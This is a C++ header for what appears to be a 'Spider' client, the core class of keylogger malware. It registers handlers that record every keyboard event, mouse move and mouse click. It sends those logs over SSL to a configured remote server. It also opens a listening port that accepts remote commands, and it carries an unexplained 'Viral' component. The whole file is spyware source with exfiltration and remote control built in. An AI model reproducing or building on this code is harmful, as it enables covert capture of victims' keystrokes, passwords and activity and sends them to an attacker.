//
// Created by roman sztergbaum on 27/09/2017.
//

#ifndef SPIDER_CLIENT_CSPIDERCORE_HPP
#define SPIDER_CLIENT_CSPIDERCORE_HPP

#include <log/Logger.hpp>
#include <Network/SSLConnection.hpp>
#include <Network/ClientSession.hpp>
#include <Network/TCPAcceptor.hpp>
#include <Protocol/CommandHandler.hpp>
#include <KeyLogger/KeyLogger.hpp>
#include <KeyLogger/KeyLoggerFactory.hpp>
#include <Viral/Viral.hpp>
#include <Logging/LogHandle.hpp>
#include <Core/ServerCommandSession.hpp>

namespace spi
{
    class CSpiderCore
    {
    public:
        explicit CSpiderCore(cfg::Config &conf) : _conf(conf),
                                                  _clientSession(_ctx, _io, conf),
                                                  _logHandle(fs::path(conf.logDir))
        {
            _log(logging::Info) << "Configuring Spider Client" << std::endl;
            _log(logging::Info) << "Using remote server " << conf.address << ":" << conf.port << std::endl;
            _log(logging::Info) << "Using port " << conf.portAcceptor << " for remote commands" << std::endl;
            _log(logging::Info) << "Using SSL certificate " << conf.certFile << std::endl;
            _log(logging::Info) << "Using SSL private key " << conf.keyFile << std::endl;
            _log(logging::Info) << "Using '" << conf.logDir << "' to store logs" << std::endl;
        }

        ~CSpiderCore()
        {
            _log(logging::Info) << "Shutting down" << std::endl;
            _keyLogger->stop();
            delete _sess;
        }

        bool run()
        {
            _log(logging::Debug) << "Starting now" << std::endl;
            __setupSigHandlers();
            __setup();
            __startAcceptor();
            _keyLogger->run();
            _clientSession.onConnect(boost::bind(&CSpiderCore::__setupLogHandleConnection,
                                                 this, net::ErrorPlaceholder));
            _clientSession.connect();
            _log(logging::Info) << "Client started successfully" << std::endl;
            _io.run();
            return true;
        }

        void stop()
        {
            _io.stop();
        }

    private:
        void __setupSigHandlers() noexcept
        {
            _io.onTerminationSignals(boost::bind(&CSpiderCore::stop, this));
        }

        void __setupLogHandleConnection(net::SSLConnection *sslConnection)
        {
            _logHandle.setConnection(sslConnection);
        }

        void __handleAccept(const ErrorCode &ec)
        {
            if (!ec) {
                _sess->onError(boost::bind(&CSpiderCore::__removeSession, this, _1));
                _sess->startSession();
            } else {
                _log(logging::Level::Warning) << "Unable to accept a command connection: " << ec.message() << std::endl;
                __startAcceptor();
            }
        }

        void __removeSession([[maybe_unused]] CommandableSession *s)
        {
            delete _sess;
            __startAcceptor();
        }

        void __startAcceptor()
        {
            _sess = new ServerCommandSession(_io, _ctx);
            _acc.onAccept(_sess->connection(), boost::bind(&CSpiderCore::__handleAccept, this, net::ErrorPlaceholder));
        }

        void __setup()
        {
            _acc.bind(_conf.portAcceptor);
            _logHandle.setup();
            _keyLogger->setup();

            _keyLogger->onMouseMoveEvent([this](proto::MouseMove &&event) {
                _logHandle.appendEntry(event);
            });
            _keyLogger->onMouseClickEvent([this](proto::MouseClick &&event) {
                _logHandle.appendEntry(event);
            });
            _keyLogger->onKeyboardEvent([this](proto::KeyEvent &&event) {
                _logHandle.appendEntry(event);
            });
        }

    private:
        cfg::Config _conf;

        net::IOManager _io;
        spi::net::SSLContext _ctx{spi::net::SSLContext::SSLv23};

        ClientSession _clientSession;

        net::TCPAcceptor _acc{_io};
        ServerCommandSession *_sess{nullptr};

        LogHandle _logHandle;

        Viral _viral;

        KeyLogPtr _keyLogger{Factory::createKeyLogger(_io)};

        logging::Logger _log{"client-spider", logging::Level::Debug};
    };
}

#endif //SPIDER_CLIENT_CSPIDERCORE_HPP
